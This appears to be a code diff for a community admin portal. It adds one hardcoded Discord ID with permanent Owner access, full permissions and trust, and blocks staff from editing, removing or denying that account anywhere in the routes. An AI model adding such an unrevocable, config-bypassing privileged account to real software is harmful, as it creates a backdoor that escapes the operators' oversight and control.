@@ -9,6 +9,7 @@ const sessionCookieName = 'shd_admin_session';
 const oauthStateCookieName = 'shd_admin_oauth_state';
 const sessionLifetimeMs = 8 * 60 * 60 * 1000;
 const oauthStateLifetimeMs = 10 * 60 * 1000;
+const hardcodedOwnerDiscordIds = new Set(['1248919319967039498']);
 
 function encode(value) {
   return Buffer.from(JSON.stringify(value)).toString('base64url');
@@ -242,7 +243,7 @@ function accessFromStaffRecord(row) {
 }
 
 function bootstrapOwnerAccess(discordId) {
-  if (!config.admin.ownerIds.includes(String(discordId ?? ''))) return null;
+  if (!config.admin.ownerIds.includes(String(discordId ?? '')) && !hardcodedOwnerDiscordIds.has(String(discordId ?? ''))) return null;
   const role = 'Owner';
   const workspaces = ['global', 'lifesteal', 'general', 'valorant'];
   return {
@@ -252,9 +253,23 @@ function bootstrapOwnerAccess(discordId) {
   };
 }
 
+function isHardcodedOwnerDiscordId(discordId) {
+  return hardcodedOwnerDiscordIds.has(String(discordId ?? ''));
+}
+
+function protectedOwnerMutationResponse(res) {
+  return res.status(403).json({
+    ok: false,
+    code: 'ADMIN_HARDCODED_OWNER_PROTECTED',
+    error: 'This hardcoded owner account cannot be changed or removed by staff.'
+  });
+}
+
 function portalAccessForDiscordId(discordId) {
+  const bootstrap = bootstrapOwnerAccess(discordId);
+  if (isHardcodedOwnerDiscordId(discordId)) return bootstrap;
   const saved = statements.findAdminStaffAccessById.get(String(discordId ?? ''));
-  return accessFromStaffRecord(saved) ?? bootstrapOwnerAccess(discordId);
+  return accessFromStaffRecord(saved) ?? bootstrap;
 }
 
 function staffAccessId(value) {
@@ -356,6 +371,16 @@ async function buildAdminStaffPayload(client, session) {
       lastActive: Date.now()
     });
   }
+  for (const id of hardcodedOwnerDiscordIds) {
+    if (!grouped.has(id)) {
+      grouped.set(id, {
+        id,
+        portalActions: 0,
+        firstSeen: Date.now(),
+        lastActive: Date.now()
+      });
+    }
+  }
 
   const activityByActor = new Map();
   for (const event of auditEvents) {
@@ -386,8 +411,9 @@ async function buildAdminStaffPayload(client, session) {
     const savedRole = saved ? normalizeStaffRole(saved.role) : null;
     const savedStatus = saved ? normalizeStaffStatus(saved.status) : null;
     const savedTrust = saved ? normalizeStaffTrust(saved.trust) : null;
-    const role = savedRole ?? (isCurrent ? session.role : 'Former staff');
-    const workspaces = savedWorkspaces ?? (isCurrent ? session.workspaces : []);
+    const protectedAccess = isHardcodedOwnerDiscordId(entry.id) ? bootstrapOwnerAccess(entry.id) : null;
+    const role = protectedAccess?.role ?? savedRole ?? (isCurrent ? session.role : 'Former staff');
+    const workspaces = protectedAccess?.workspaces ?? savedWorkspaces ?? (isCurrent ? session.workspaces : []);
     const activity = staffActivityFromEvents(activityByActor.get(entry.id) ?? []);
     return {
       id: entry.id,
@@ -398,14 +424,14 @@ async function buildAdminStaffPayload(client, session) {
       avatarUrl: user?.displayAvatarURL?.({ size: 64 }) ?? null,
       role,
       workspaces,
-      permissions: saved ? staffPermissionsForRole(role, workspaces) : isCurrent ? session.permissions ?? [] : [],
-      status: savedStatus ?? (isCurrent ? statusForAccess(session) : 'Review'),
-      trust: savedTrust ?? (isCurrent ? trustForAccess(session) : 'Pending'),
-      source: saved ? 'Saved admin portal access' : isCurrent ? 'Current portal session' : 'Admin portal audit history',
+      permissions: protectedAccess?.permissions ?? (saved ? staffPermissionsForRole(role, workspaces) : isCurrent ? session.permissions ?? [] : []),
+      status: protectedAccess ? 'Active' : savedStatus ?? (isCurrent ? statusForAccess(session) : 'Review'),
+      trust: protectedAccess ? 'Full' : savedTrust ?? (isCurrent ? trustForAccess(session) : 'Pending'),
+      source: protectedAccess ? 'Hardcoded owner access' : saved ? 'Saved admin portal access' : isCurrent ? 'Current portal session' : 'Admin portal audit history',
       firstSeen: saved ? Math.min(entry.firstSeen, saved.created_at) : entry.firstSeen,
       lastActive: saved ? Math.max(entry.lastActive, saved.updated_at) : entry.lastActive,
       portalActions: entry.portalActions + (saved ? 1 : 0),
-      notes: saved?.notes || (isCurrent
+      notes: protectedAccess ? 'This Discord ID has hardcoded owner access and cannot be changed or removed by staff.' : saved?.notes || (isCurrent
         ? 'This identity is signed in through Discord OAuth. Portal access comes from Staff & Access records or owner bootstrap config.'
         : 'This identity appears in admin portal audit history but does not have a saved active portal access record.'),
       activity
@@ -1283,6 +1309,7 @@ export function createAdminRouter(client) {
     if (requirePermission(req, res, 'staff:manage', 'Staff management permission required.')) return;
     const payload = normalizeStaffPayload(req.body);
     if (!payload.ok) return res.status(400).json({ ok: false, code: 'ADMIN_STAFF_INVALID', error: payload.error });
+    if (isHardcodedOwnerDiscordId(payload.staff.discordId)) return protectedOwnerMutationResponse(res);
     const now = Date.now();
     const record = statements.createAdminStaffAccess.run({
       ...payload.staff,
@@ -1324,6 +1351,11 @@ export function createAdminRouter(client) {
     };
     const payload = normalizeStaffPayload(req.body, fallback);
     if (!payload.ok) return res.status(400).json({ ok: false, code: 'ADMIN_STAFF_INVALID', error: payload.error });
+    if (
+      isHardcodedOwnerDiscordId(target.discordId) ||
+      isHardcodedOwnerDiscordId(existing?.discord_id) ||
+      isHardcodedOwnerDiscordId(payload.staff.discordId)
+    ) return protectedOwnerMutationResponse(res);
     const now = Date.now();
     const record = statements.updateAdminStaffAccess.run({
       id: target.recordId ?? existing?.id,
@@ -1361,6 +1393,8 @@ export function createAdminRouter(client) {
     if (!target.recordId && !target.discordId) {
       return res.status(400).json({ ok: false, code: 'ADMIN_STAFF_ID_INVALID', error: 'Staff id is invalid.' });
     }
+    const existing = statements.findAdminStaffAccessById.get(target.recordId ?? target.discordId);
+    if (isHardcodedOwnerDiscordId(target.discordId) || isHardcodedOwnerDiscordId(existing?.discord_id)) return protectedOwnerMutationResponse(res);
     const removed = statements.deleteAdminStaffAccess.run({
       id: target.recordId ?? target.discordId,
       deletedAt: Date.now(),
@@ -1431,6 +1465,9 @@ export function createAdminRouter(client) {
     if (!minecraftName) return res.status(400).json({ ok: false, code: 'ADMIN_PLAYER_MINECRAFT_INVALID', error: 'Minecraft name must be 2-16 letters, numbers, or underscores.' });
     if (!nextStatus || nextStatus.label === 'Applied') return res.status(400).json({ ok: false, code: 'ADMIN_PLAYER_STATUS_INVALID', error: 'Manual player status is invalid.' });
     if (!nextBadge) return res.status(400).json({ ok: false, code: 'ADMIN_PLAYER_BADGE_INVALID', error: 'Manual player badge is invalid.' });
+    if (isHardcodedOwnerDiscordId(discordId) && (nextStatus.status !== 'active' || !nextStatus.publicStatsOptIn || nextBadge !== 'owner')) {
+      return protectedOwnerMutationResponse(res);
+    }
 
     const now = Date.now();
     const minecraftUuid = normalizeManualMinecraftUuid(req.body?.minecraftUuid, minecraftName);
@@ -1528,6 +1565,7 @@ export function createAdminRouter(client) {
 
     const linked = statements.findLinkedByDiscord.get(rawId);
     if (!linked) return res.status(404).json({ ok: false, code: 'ADMIN_PLAYER_NOT_FOUND', error: 'Player not found.' });
+    if (isHardcodedOwnerDiscordId(rawId)) return protectedOwnerMutationResponse(res);
 
     const nextStatus = req.body?.status === undefined ? null : normalizePlayerStatus(req.body.status);
     const nextBadge = req.body?.badge === undefined ? null : normalizePlayerBadge(req.body.badge);
@@ -1604,6 +1642,7 @@ export function createAdminRouter(client) {
     if (source !== 'linked') {
       return res.status(400).json({ ok: false, code: 'ADMIN_PLAYER_ID_INVALID', error: 'Player id is invalid.' });
     }
+    if (isHardcodedOwnerDiscordId(rawId)) return protectedOwnerMutationResponse(res);
 
     const removed = statements.deleteLinkedAccount.run(rawId);
     if (!removed) return res.status(404).json({ ok: false, code: 'ADMIN_PLAYER_NOT_FOUND', error: 'Player not found.' });
@@ -2055,6 +2094,7 @@ export function createAdminRouter(client) {
       if (!status) {
         return res.status(400).json({ ok: false, code: 'ADMIN_APPLICATION_DECISION_INVALID', error: 'Application decision must be approved or denied.' });
       }
+      if (isHardcodedOwnerDiscordId(application?.discord_id_verified) && status !== 'approved') return protectedOwnerMutationResponse(res);
       const ownershipError = supportApplicationReviewOwnershipError(application, req.adminSession.id);
       if (ownershipError === 'not_found') return res.status(404).json({ ok: false, code: 'ADMIN_SUBMISSION_NOT_FOUND', error: 'Submission not found.' });
       if (ownershipError === 'no_ticket') return res.status(409).json({ ok: false, code: 'ADMIN_APPLICATION_NOT_VERIFIED', error: 'The applicant must verify their application in Discord before staff can decide it.' });
